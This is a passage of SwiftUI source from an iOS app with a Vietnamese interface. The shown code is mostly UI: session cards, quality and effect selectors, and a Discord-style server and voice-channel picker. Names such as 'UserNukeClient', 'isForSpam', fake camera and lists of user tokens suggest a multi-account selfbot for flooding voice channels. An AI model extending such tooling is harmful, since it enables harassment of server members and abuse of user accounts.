                                                    .foregroundColor(.indigo)
                                            )
                                    }
                                    Circle()
                                        .fill(dotColor)
                                        .frame(width: 11, height: 11)
                                        .overlay(Circle().stroke(Color(UIColor.secondarySystemGroupedBackground), lineWidth: 2))
                                }

                                VStack(alignment: .leading, spacing: 3) {
                                    HStack(spacing: 5) {
                                        Text(s.username)
                                            .font(.subheadline.bold())
                                            .lineLimit(1)
                                        if s.premiumType == 1 || s.premiumType == 2 {
                                            microBadge("NITRO", bg: Color.pink.opacity(0.18), fg: .pink)
                                        }
                                        if s.isGoLiveActive {
                                            microBadge("LIVE", bg: .red)
                                        }
                                        if s.isFakeCamActive {
                                            microBadge("CAM", bg: .purple)
                                        }
                                    }
                                    Text(s.lastLog.isEmpty ? (s.isJoined ? "Đang trong phòng" : "Đang kết nối...") : s.lastLog)
                                        .font(.caption2)
                                        .foregroundStyle(.secondary)
                                        .lineLimit(1)
                                }

                                Spacer()
                            }
                            .padding(10)
                            .background(Color(UIColor.tertiarySystemGroupedBackground))
                            .clipShape(RoundedRectangle(cornerRadius: 13, style: .continuous))
                        }
                    }
                }
            }
        }
    }

    // Card 8: Nhật Ký Treo Room
    private var treoLogsCard: some View {
        Group {
            if !voiceRoom.logs.isEmpty {
                studioTerminalCard(
                    title: "Nhật Ký Kết Nối",
                    accent: .indigo,
                    logs: voiceRoom.logs,
                    copied: $copiedRoomLog,
                    onClear: { voiceRoom.logs.removeAll() }
                )
            }
        }
    }

    // MARK: - TACTILE STUDIO CONTROLS
    private func tactileOptionPill(
        title: String,
        icon: String,
        isSelected: Bool,
        accent: Color,
        action: @escaping () -> Void
    ) -> some View {
        Button(action: action) {
            HStack(spacing: 6) {
                Image(systemName: icon)
                    .font(.system(size: 12, weight: .bold))
                Text(title)
                    .font(.system(size: 12, weight: .bold, design: .rounded))
                    .lineLimit(1)
                    .minimumScaleFactor(0.82)
            }
            .frame(maxWidth: .infinity)
            .padding(.vertical, 10)
            .background(isSelected ? accent.opacity(0.16) : Color(UIColor.tertiarySystemGroupedBackground))
            .foregroundColor(isSelected ? accent : .secondary)
            .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
            .overlay(
                RoundedRectangle(cornerRadius: 12, style: .continuous)
                    .stroke(isSelected ? accent.opacity(0.45) : Color.clear, lineWidth: 1.2)
            )
        }
        .buttonStyle(.plain)
    }

    private func tactileFeatureTile(
        title: String,
        subtitle: String,
        icon: String,
        isOn: Bool,
        activeColor: Color,
        action: @escaping () -> Void
    ) -> some View {
        Button(action: action) {
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Image(systemName: icon)
                        .font(.system(size: 15, weight: .bold))
                        .foregroundColor(isOn ? .white : activeColor)
                        .frame(width: 30, height: 30)
                        .background(isOn ? activeColor : activeColor.opacity(0.14))
                        .clipShape(RoundedRectangle(cornerRadius: 9, style: .continuous))
                    Spacer()
                    Text(isOn ? "BẬT" : "TẮT")
                        .font(.system(size: 10, weight: .black, design: .rounded))
                        .foregroundColor(isOn ? activeColor : .secondary)
                }

                VStack(alignment: .leading, spacing: 2) {
                    Text(title)
                        .font(.system(size: 13, weight: .bold, design: .rounded))
                        .foregroundColor(.primary)
                        .lineLimit(1)
                    Text(subtitle)
                        .font(.system(size: 10))
                        .foregroundStyle(.secondary)
                        .lineLimit(1)
                }
            }
            .padding(12)
            .frame(maxWidth: .infinity, alignment: .leading)
            .background(isOn ? activeColor.opacity(0.11) : Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))
            .overlay(
                RoundedRectangle(cornerRadius: 14, style: .continuous)
                    .stroke(isOn ? activeColor.opacity(0.45) : Color.clear, lineWidth: 1.2)
            )
        }
        .buttonStyle(.plain)
    }

    private func presetChip(label: String, isSelected: Bool, color: Color, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 11, weight: .bold, design: .rounded))
                .frame(maxWidth: .infinity)
                .padding(.vertical, 6)
                .background(isSelected ? color : Color(UIColor.secondarySystemGroupedBackground))
                .foregroundColor(isSelected ? .white : .primary)
                .clipShape(Capsule())
        }
        .buttonStyle(.plain)
    }

    @ViewBuilder
    private func cacheReadinessView(status: H264CacheStatus, accent: Color) -> some View {
        switch status {
        case .none:
            EmptyView()
        case .directPassthrough:
            HStack(spacing: 5) {
                Image(systemName: "checkmark.seal.fill")
                    .font(.system(size: 11))
                Text("Sẵn sàng chạy nền Full Video (Direct 0% GPU)")
                    .font(.system(size: 10, weight: .bold))
                    .lineLimit(1)
            }
            .foregroundColor(.green)
            .padding(.horizontal, 8)
            .padding(.vertical, 4)
            .background(Color.green.opacity(0.12))
            .clipShape(Capsule())
        case .ready(let totalSec):
            HStack(spacing: 5) {
                Image(systemName: "checkmark.seal.fill")
                    .font(.system(size: 11))
                Text("Sẵn sàng chạy nền Full Video (\(formatSeconds(totalSec)) • 0% GPU)")
                    .font(.system(size: 10, weight: .bold))
                    .lineLimit(1)
            }
            .foregroundColor(.green)
            .padding(.horizontal, 8)
            .padding(.vertical, 4)
            .background(Color.green.opacity(0.12))
            .clipShape(Capsule())
        case .preparing(let pct, let cachedSec):
            VStack(alignment: .leading, spacing: 4) {
                HStack(spacing: 5) {
                    ProgressView()
                        .scaleEffect(0.65)
                        .frame(width: 12, height: 12)
                    Text("Đang tối ưu chạy nền Full Video: \(Int(pct * 100))% (\(formatSeconds(cachedSec)))")
                        .font(.system(size: 10, weight: .bold))
                        .foregroundColor(accent)
                        .lineLimit(1)
                }
                ProgressView(value: min(1.0, max(0.0, pct)))
                    .tint(accent)
            }
            .padding(.horizontal, 8)
            .padding(.vertical, 6)
            .background(accent.opacity(0.09))
            .clipShape(RoundedRectangle(cornerRadius: 8, style: .continuous))
        case .pausedForBackground(let pct, let cachedSec):
            HStack(spacing: 5) {
                Image(systemName: "moon.stars.fill")
                    .font(.system(size: 11))
                Text("Đã tối ưu \(Int(pct * 100))% (\(formatSeconds(cachedSec))) • Mở app để tối ưu nốt")
                    .font(.system(size: 10, weight: .bold))
                    .lineLimit(1)
            }
            .foregroundColor(.orange)
            .padding(.horizontal, 8)
            .padding(.vertical, 4)
            .background(Color.orange.opacity(0.14))
            .clipShape(Capsule())
        case .failed(let msg):
            HStack(spacing: 5) {
                Image(systemName: "exclamationmark.triangle.fill")
                    .font(.system(size: 11))
                Text(msg)
                    .font(.system(size: 10, weight: .bold))
                    .lineLimit(1)
            }
            .foregroundColor(.red)
            .padding(.horizontal, 8)
            .padding(.vertical, 4)
            .background(Color.red.opacity(0.12))
            .clipShape(Capsule())
        }
    }

    private func shortQualityTitle(_ q: TreoVideoQualityMode) -> String {
        switch q {
        case .autoNitro: return "Tự động Nitro"
        case .hd720p30: return "720p • 30fps"
        case .fhd1080p60: return "1080p • 60fps"
        }
    }

    private func fxSymbol(for fx: SpamAudioFX) -> String {
        let lower = fx.rawValue.lowercased()
        if lower.contains("bass") { return "speaker.wave.3.fill" }
        if lower.contains("night") { return "bolt.fill" }
        if lower.contains("slow") { return "moon.stars.fill" }
        if lower.contains("ear") { return "flame.fill" }
        return "waveform"
    }

    // MARK: - HELPERS
    private var activeTokens: [TokenInfo] {
        if !app.selectedTokenIds.isEmpty {
            return app.tokens.filter { app.selectedTokenIds.contains($0.id) }
        }
        if let at = app.activeToken { return [at] }
        return app.tokens
    }

    private var singleTokenList: [TokenInfo] {
        if let at = app.activeToken { return [at] }
        if let f = app.tokens.first { return [f] }
        return []
    }

    private func formatTime(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "HH:mm:ss"
        return df.string(from: d)
    }

    private func formatSeconds(_ sec: Double) -> String {
        let s = Int(sec)
        let m = s / 60
        let r = s % 60
        return String(format: "%02d:%02d", m, r)
    }
}

// MARK: - VOICE GUILD & CHANNEL PICKER SHEET
struct VoiceGuildPickerSheet: View {
    var isForSpam: Bool = false
    @EnvironmentObject var app: AppState
    @EnvironmentObject var voiceRoom: VoiceRoomManager
    @EnvironmentObject var musicStream: MusicStreamManager
    @Environment(\.dismiss) var dismiss

    @State private var search = ""
    @State private var selectedGuild: Guild? = nil
    @State private var channels: [Channel] = []
    @State private var isLoading = false

    var filteredGuilds: [Guild] {
        if search.isEmpty { return app.multiGuilds }
        return app.multiGuilds.filter { $0.name.localizedCaseInsensitiveContains(search) }
    }

    var body: some View {
        NavigationStack {
            Group {
                if let g = selectedGuild {
                    // Danh sách kênh Voice trong Server
                    List {
                        if isLoading {
                            HStack {
                                Spacer()
                                ProgressView("Đang tải danh sách Voice...")
                                Spacer()
                            }
                        } else if channels.isEmpty {
                            Text("Không tìm thấy kênh Voice nào trong Server này")
                                .font(.subheadline)
                                .foregroundStyle(.secondary)
                        } else {
                            ForEach(channels) { ch in
                                Button {
                                    if isForSpam {
                                        musicStream.selectedGuild = g
                                        musicStream.selectedChannel = ch
                                        musicStream.targetChannelId = ch.id
                                    } else {
                                        voiceRoom.selectedGuild = g
                                        voiceRoom.selectedChannel = ch
                                        voiceRoom.targetChannelId = ch.id
                                    }
                                    dismiss()
                                } label: {
                                    HStack {
                                        Image(systemName: "speaker.wave.2.fill").foregroundColor(.indigo)
                                        Text(ch.displayName).font(.subheadline.bold()).foregroundColor(.primary)
                                        Spacer()
                                        Image(systemName: "chevron.right").font(.caption).foregroundColor(.secondary)
                                    }
                                }
                            }
                        }
                    }
                    .navigationTitle(g.name)
                    .toolbar {
                        ToolbarItem(placement: .cancellationAction) {
                            Button("Đổi Server") { selectedGuild = nil; channels = [] }
                        }
                    }
                } else {
                    // Danh sách Server
                    List(filteredGuilds) { g in
                        Button {
                            selectedGuild = g
                            loadChannels(for: g)
                        } label: {
                            HStack(spacing: 12) {
                                if let icon = g.icon, !AppEndpoints.cdnIcons.isEmpty,
                                   let url = URL(string: "\(AppEndpoints.cdnIcons)/\(g.id)/\(icon).png?size=64") {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray) }
                                    .frame(width: 36, height: 36).clipShape(Circle())
                                } else {
                                    Circle().fill(.gray.opacity(0.3)).frame(width: 36, height: 36)
                                        .overlay(Text(String(g.name.prefix(1))).font(.subheadline.bold()))
                                }
                                Text(g.name).font(.subheadline.bold()).foregroundStyle(.primary)
                                Spacer()
                                Image(systemName: "chevron.right").font(.caption).foregroundColor(.secondary)
                            }
                        }
                    }
                    .searchable(text: $search, prompt: "Tìm kiếm Server...")
                    .navigationTitle("Chọn Server")
                    .toolbar {
                        ToolbarItem(placement: .cancellationAction) {
                            Button("Đóng") { dismiss() }
                        }
                    }
                }
            }
            .navigationBarTitleDisplayMode(.inline)
        }
    }

    private func loadChannels(for g: Guild) {
        guard let tok = (musicStream.selectedToken ?? app.activeToken ?? app.tokens.first)?.token else { return }
        let scope: FeatureScope = isForSpam ? .music : .voice
        isLoading = true
        Task {
            guard await LicenseManager.shared.authorizeFeature(scope) else {
                await MainActor.run {
                    self.channels = []
                    self.isLoading = false
                }
                return
            }
            do {
                let all: [Channel] = try await UserNukeClient(token: tok, scope: scope).getChannels(g.id)
                let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
                await MainActor.run {
                    self.channels = vcs
                    self.isLoading = false
                }
            } catch {
                await MainActor.run {
                    self.channels = []
                    self.isLoading = false
                }
            }
        }
    }
}
